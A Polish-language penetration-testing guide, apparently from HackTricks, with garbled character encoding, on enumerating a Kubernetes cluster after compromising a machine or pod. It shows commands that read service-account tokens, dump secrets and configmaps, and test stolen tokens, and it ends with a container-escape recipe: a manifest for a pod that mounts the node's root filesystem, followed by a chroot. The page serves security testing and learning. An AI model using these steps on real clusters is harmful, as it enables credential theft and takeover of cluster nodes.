# Kubernetes Enumeration

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriÃ³w GitHub.**

</details>

## Tokeny Kubernetes

JeÅ›li masz skompromitowany dostÄ™p do maszyny, uÅ¼ytkownik moÅ¼e mieÄ‡ dostÄ™p do pewnej platformy Kubernetes. Token zwykle znajduje siÄ™ w pliku wskazywanym przez zmiennÄ… Å›rodowiskowÄ… **`KUBECONFIG`** lub **wewnÄ…trz `~/.kube`**.

W tej folderze moÅ¼esz znaleÅºÄ‡ pliki konfiguracyjne z **tokenami i konfiguracjami do poÅ‚Ä…czenia z serwerem API**. W tej folderze moÅ¼esz rÃ³wnieÅ¼ znaleÅºÄ‡ folder cache z wczeÅ›niej pobranymi informacjami.

JeÅ›li masz skompromitowany pod w Å›rodowisku Kubernetes, istniejÄ… inne miejsca, gdzie moÅ¼na znaleÅºÄ‡ tokeny i informacje o bieÅ¼Ä…cym Å›rodowisku K8:

### Tokeny konta usÅ‚ugi

Zanim przejdziesz dalej, jeÅ›li nie wiesz, czym jest usÅ‚uga w Kubernetes, sugerujÄ™, abyÅ› **kliknÄ…Å‚ ten link i przeczytaÅ‚ przynajmniej informacje na temat architektury Kubernetes**.

ZaczerpniÄ™te z [dokumentacji](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) Kubernetes:

_â€Podczas tworzenia poda, jeÅ›li nie okreÅ›lisz konta usÅ‚ugi, automatycznie przypisane jest_ domyÅ›lne _konto usÅ‚ugi w tej samej przestrzeni nazw.â€_

**ServiceAccount** to obiekt zarzÄ…dzany przez Kubernetes i uÅ¼ywany do dostarczania toÅ¼samoÅ›ci dla procesÃ³w uruchamianych w podzie.\
KaÅ¼de konto usÅ‚ugi ma zwiÄ…zany z nim sekret, a ten sekret zawiera token nosiciela. Jest to token JSON Web Token (JWT), metoda reprezentowania roszczeÅ„ w sposÃ³b bezpieczny miÄ™dzy dwiema stronami.

Zazwyczaj **jeden** z katalogÃ³w:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

zawierajÄ… pliki:

* **ca.crt**: To jest certyfikat CA do sprawdzania komunikacji Kubernetes
* **namespace**: Wskazuje bieÅ¼Ä…cÄ… przestrzeÅ„ nazw
* **token**: Zawiera **token usÅ‚ugi** bieÅ¼Ä…cego poda.

Teraz, gdy masz token, moÅ¼esz znaleÅºÄ‡ serwer API w zmiennej Å›rodowiskowej **`KUBECONFIG`**. Aby uzyskaÄ‡ wiÄ™cej informacji, uruchom `(env | set) | grep -i "kuber|kube`**`"`**

Token konta usÅ‚ugi jest podpisywany przez klucz znajdujÄ…cy siÄ™ w pliku **sa.key** i sprawdzany przez **sa.pub**.

DomyÅ›lna lokalizacja w **Kubernetes**:

* /etc/kubernetes/pki

DomyÅ›lna lokalizacja w **Minikube**:

* /var/lib/localkube/certs

### GorÄ…ce pod

_**GorÄ…ce pod**_ to pod zawierajÄ…cy uprzywilejowany token konta usÅ‚ugi. Uprzywilejowany token konta usÅ‚ugi to token, ktÃ³ry ma uprawnienia do wykonywania uprzywilejowanych zadaÅ„, takich jak wyÅ›wietlanie sekretÃ³w, tworzenie podÃ³w itp.

## RBAC

JeÅ›li nie wiesz, czym jest **RBAC**, **przeczytaj tÄ™ sekcjÄ™**.

## PrzeglÄ…d wyliczania

Aby wyliczyÄ‡ Å›rodowisko K8s, potrzebujesz kilku rzeczy:

* **Poprawny token uwierzytelniajÄ…cy**. W poprzedniej sekcji zobaczyliÅ›my, gdzie szukaÄ‡ tokenu uÅ¼ytkownika i tokenu konta usÅ‚ugi.
* **Adres (**_**https://host:port**_**) API Kubernetes**. Zazwyczaj moÅ¼na go znaleÅºÄ‡ w zmiennych Å›rodowiskowych i/lub w pliku konfiguracyjnym kube.
* **Opcjonalnie**: **ca.crt do weryfikacji serwera API**. MoÅ¼na go znaleÅºÄ‡ w tych samych miejscach, w ktÃ³rych moÅ¼na znaleÅºÄ‡ token. Jest to przydatne do weryfikacji certyfikatu serwera API, ale uÅ¼ywajÄ…c `--insecure-skip-tls-verify` z `kubectl` lub `-k` z `curl`, nie bÄ™dziesz potrzebowaÄ‡ tego.

Z tymi szczegÃ³Å‚ami moÅ¼esz **wyliczaÄ‡ Kubernetes**. JeÅ›li **API** z jakiegoÅ› powodu jest **dostÄ™pne** przez **Internet**, moÅ¼esz po prostu pobraÄ‡ te informacje i wyliczaÄ‡ platformÄ™ z wÅ‚asnego hosta.

Jednak zwykle **serwer API znajduje siÄ™ w sieci wewnÄ™trznej**, dlatego bÄ™dziesz musiaÅ‚ **utworzyÄ‡ tunel** przez skompromitowanÄ… maszynÄ™, aby uzyskaÄ‡ do niego dostÄ™p z wÅ‚asnej maszyny, lub moÅ¼esz **przesÅ‚aÄ‡ binarny plik** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux), lub uÅ¼yÄ‡ **`curl/wget/cokolwiek`** do wykonywania surowych Å¼Ä…daÅ„ HTTP do serwera API.

### RÃ³Å¼nice miÄ™dzy czasownikami `list` a `get`

Z uprawnieniami **`get`** moÅ¼esz uzyskaÄ‡ dostÄ™p do informacji o konkretnych zasobach (_opcja `describe` w_ `kubectl`\_) API:

```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```

JeÅ›li masz uprawnienie **`list`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API w celu wylistowania danego typu zasobu (_opcja **`get`** w poleceniu **`kubectl`**_):

```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```

JeÅ›li masz uprawnienie **`watch`**, moÅ¼esz wykonywaÄ‡ Å¼Ä…dania API w celu monitorowania zasobÃ³w:

```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```

OtwierajÄ… poÅ‚Ä…czenie strumieniowe, ktÃ³re zwraca peÅ‚ny manifest Deployment za kaÅ¼dym razem, gdy siÄ™ zmienia (lub gdy tworzony jest nowy).

{% hint style="danger" %}
NastÄ™pujÄ…ce polecenia `kubectl` wskazujÄ… tylko, jak wyÅ›wietliÄ‡ obiekty. JeÅ›li chcesz uzyskaÄ‡ dostÄ™p do danych, musisz uÅ¼yÄ‡ `describe` zamiast `get`.
{% endhint %}

### UÅ¼ywajÄ…c curl

Z wnÄ™trza poda moÅ¼na uÅ¼yÄ‡ kilku zmiennych Å›rodowiskowych:

```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```

{% hint style="warning" %}
DomyÅ›lnie pod moÅ¼e uzyskaÄ‡ dostÄ™p do serwera kube-api pod adresem domeny `kubernetes.default.svc`, a sieÄ‡ kube moÅ¼na zobaczyÄ‡ w `/etc/resolv.config`, gdzie znajduje siÄ™ adres serwera DNS Kubernetes (".1" z tego samego zakresu to punkt koÅ„cowy kube-api).
{% endhint %}

### UÅ¼ywajÄ…c kubectl

MajÄ…c token i adres serwera API, moÅ¼esz go uzyskaÄ‡ za pomocÄ… kubectl lub curl, jak wskazano tutaj:

DomyÅ›lnie, APISERVER komunikuje siÄ™ za pomocÄ… schematu `https://`

```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```

> jeÅ›li brak `https://` w adresie URL, moÅ¼esz otrzymaÄ‡ bÅ‚Ä…d typu Bad Request.

MoÅ¼esz znaleÅºÄ‡ [**oficjalny arkusz oszustw kubectl tutaj**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Celem poniÅ¼szych sekcji jest przedstawienie w uporzÄ…dkowany sposÃ³b rÃ³Å¼nych opcji do wyliczenia i zrozumienia nowego K8s, do ktÃ³rego uzyskaÅ‚eÅ› dostÄ™p.

Aby znaleÅºÄ‡ Å¼Ä…danie HTTP, ktÃ³re wysyÅ‚a `kubectl`, moÅ¼esz uÅ¼yÄ‡ parametru `-v=8`.

#### MitM kubectl - Proxyfikacja kubectl

```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```

### Aktualna konfiguracja

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

JeÅ›li udaÅ‚o Ci siÄ™ ukraÅ›Ä‡ dane uwierzytelniajÄ…ce uÅ¼ytkownikÃ³w, moÅ¼esz **skonfigurowaÄ‡ je lokalnie** uÅ¼ywajÄ…c czegoÅ› takiego jak:

```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```

### Pobierz obsÅ‚ugiwane zasoby

DziÄ™ki tym informacjom bÄ™dziesz wiedziaÅ‚, jakie usÅ‚ugi moÅ¼esz wymieniÄ‡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Uzyskaj bieÅ¼Ä…ce uprawnienia

Uruchom polecenie `kubectl auth can-i '*' '*'` aby sprawdziÄ‡, czy masz uprawnienia do wykonania dowolnej operacji na dowolnym zasobie w klastrze Kubernetes. JeÅ›li otrzymasz odpowiedÅº `yes`, oznacza to, Å¼e masz peÅ‚ne uprawnienia. W przeciwnym razie, otrzymasz odpowiedÅº `no` lub `unknown`, co oznacza, Å¼e nie masz peÅ‚nych uprawnieÅ„.

```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```

API

```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

Inny sposÃ³b na sprawdzenie swoich uprawnieÅ„ to uÅ¼ycie narzÄ™dzia: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

WiÄ™cej informacji na temat **Kubernetes RBAC** moÅ¼na znaleÅºÄ‡ w:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Gdy juÅ¼ wiesz, jakie masz uprawnienia**, sprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby dowiedzieÄ‡ siÄ™, **czy moÅ¼na je wykorzystaÄ‡** do eskalacji uprawnieÅ„:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Uzyskaj inne role

```bash
k get roles
k get clusterroles
```

API

```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```

### Uzyskaj przestrzenie nazw

Kubernetes obsÅ‚uguje **wiele wirtualnych klastrÃ³w** opartych na tym samym fizycznym klastrze. Te wirtualne klastry nazywane sÄ… **przestrzeniami nazw**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
API
{% endtab %}

{% tab title="undefined" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}

{% tab title="kubectl" %}
#### Pobierz tajemnice

```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```

API

```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

JeÅ›li moÅ¼esz odczytaÄ‡ tajemnice, moÅ¼esz uÅ¼yÄ‡ poniÅ¼szych linii, aby uzyskaÄ‡ uprawnienia zwiÄ…zane z kaÅ¼dym tokenem:

```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```

### Pobierz konta usÅ‚ug

Jak omÃ³wiono na poczÄ…tku tej strony, **podczas uruchamiania poda zwykle przypisywane jest konto usÅ‚ugi**. Dlatego teÅ¼, wylistowanie kont usÅ‚ug, ich uprawnieÅ„ i miejsca, w ktÃ³rym sÄ… uruchamiane, moÅ¼e umoÅ¼liwiÄ‡ uÅ¼ytkownikowi eskalacjÄ™ uprawnieÅ„.

```bash
k get serviceaccounts
```

API

```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```

### Pobierz wdroÅ¼enia

WdroÅ¼enia okreÅ›lajÄ… **komponenty**, ktÃ³re muszÄ… byÄ‡ **uruchomione**.

```
.k get deployments
k get deployments -n custnamespace
```

API

```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```

### Pobierz Pods

Pods to rzeczywiste **kontenery**, ktÃ³re zostanÄ… **uruchomione**.

```
k get pods
k get pods -n custnamespace
```

API

```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```

### Uzyskaj usÅ‚ugi

UsÅ‚ugi Kubernetes sÄ… uÅ¼ywane do **udostÄ™pniania usÅ‚ugi na okreÅ›lonym porcie i adresie IP** (ktÃ³re bÄ™dÄ… dziaÅ‚aÄ‡ jako rÃ³wnowaÅ¼nik obciÄ…Å¼enia dla podÃ³w, ktÃ³re faktycznie oferujÄ… usÅ‚ugÄ™). Jest to interesujÄ…ce, aby wiedzieÄ‡, gdzie moÅ¼na znaleÅºÄ‡ inne usÅ‚ugi, ktÃ³re moÅ¼na prÃ³bowaÄ‡ zaatakowaÄ‡.

```
k get services
k get services -n custnamespace
```

API

```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```

### Pobierz wÄ™zÅ‚y

Pobierz wszystkie **wÄ™zÅ‚y skonfigurowane wewnÄ…trz klastra**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
API

```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Uzyskaj DaemonSets

**DaeamonSets** pozwala upewniÄ‡ siÄ™, Å¼e **konkretny pod dziaÅ‚a na wszystkich wÄ™zÅ‚ach** klastra (lub na wybranych). JeÅ›li usuniesz DaemonSet, zarzÄ…dzane przez niego pody rÃ³wnieÅ¼ zostanÄ… usuniÄ™te.

```
k get daemonsets
```

API

```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```

### Uzyskaj cronjob

Cron joby pozwalajÄ… na zaplanowanie uruchomienia poda, ktÃ³ry wykona okreÅ›lone dziaÅ‚anie, korzystajÄ…c z skÅ‚adni crontab.

```
k get cronjobs
```

API

```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```

### Uzyskaj configMap

configMap zawsze zawiera wiele informacji i plikÃ³w konfiguracyjnych, ktÃ³re sÄ… dostarczane aplikacjom uruchamianym w klastrze Kubernetes. Zazwyczaj moÅ¼na znaleÅºÄ‡ wiele haseÅ‚, sekretÃ³w i tokenÃ³w, ktÃ³re sÄ… uÅ¼ywane do Å‚Ä…czenia i uwierzytelniania w innych usÅ‚ugach wewnÄ™trznych/zewnÄ™trznych.

{% tabs %}
{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
API
{% endtab %}

{% tab title="undefined" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% tab title="kubectl" %}
Polecenie `kubectl get all` zwraca wszystkie zasoby w klastrze Kubernetes. MoÅ¼e to obejmowaÄ‡ pod, usÅ‚ugi, repliki, konfiguracje, skale, cronjoby, itp. Polecenie to jest przydatne do szybkiego przeglÄ…du wszystkich zasobÃ³w w klastrze.

```bash
kubectl get all
```
{% endtab %}

{% tab title="kubespy" %}
Polecenie `kubespy` pozwala na monitorowanie zasobÃ³w w klastrze Kubernetes. MoÅ¼e to obejmowaÄ‡ pod, usÅ‚ugi, repliki, konfiguracje, skale, cronjoby, itp. Polecenie to jest przydatne do Å›ledzenia zmian w klastrze.

```bash
kubespy all
```
{% endtab %}
{% endtabs %}

```
k get all
```

### **Uzyskaj dane o zuÅ¼yciu zasobÃ³w przez Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ucieczka z pojemnika

JeÅ›li masz moÅ¼liwoÅ›Ä‡ tworzenia nowych pojemnikÃ³w, moÅ¼esz sprÃ³bowaÄ‡ uciec z nich do wÄ™zÅ‚a. Aby to zrobiÄ‡, musisz utworzyÄ‡ nowy pojemnik za pomocÄ… pliku yaml, przeÅ‚Ä…czyÄ‡ siÄ™ na utworzony pojemnik, a nastÄ™pnie uÅ¼yÄ‡ polecenia chroot, aby wejÅ›Ä‡ do systemu wÄ™zÅ‚a. MoÅ¼esz uÅ¼yÄ‡ istniejÄ…cych juÅ¼ pojemnikÃ³w jako odniesienia dla pliku yaml, poniewaÅ¼ wyÅ›wietlajÄ… istniejÄ…ce obrazy i Å›cieÅ¼ki.

```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```

> JeÅ›li potrzebujesz utworzyÄ‡ pod na konkretnym wÄ™Åºle, moÅ¼esz uÅ¼yÄ‡ poniÅ¼szej komendy, aby uzyskaÄ‡ etykiety na wÄ™Åºle
>
> `k get nodes --show-labels`
>
> Zwykle, kubernetes.io/hostname i node-role.kubernetes.io/master sÄ… dobrymi etykietami do wyboru.

NastÄ™pnie utwÃ³rz plik attack.yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```

[oryginalne ÅºrÃ³dÅ‚o yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

NastÄ™pnie tworzysz pod.

```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```

Teraz moÅ¼esz przeÅ‚Ä…czyÄ‡ siÄ™ do utworzonego poda, postÄ™pujÄ…c w nastÄ™pujÄ…cy sposÃ³b:

```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```

I na koniec chrootujesz siÄ™ do systemu wÄ™zÅ‚a

```bash
chroot /root /bin/bash
```

Informacje uzyskane z: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atakowanie i obrona Kubernetes: Bust-A-Kube â€“ Odcinek 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## OdwoÅ‚ania

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
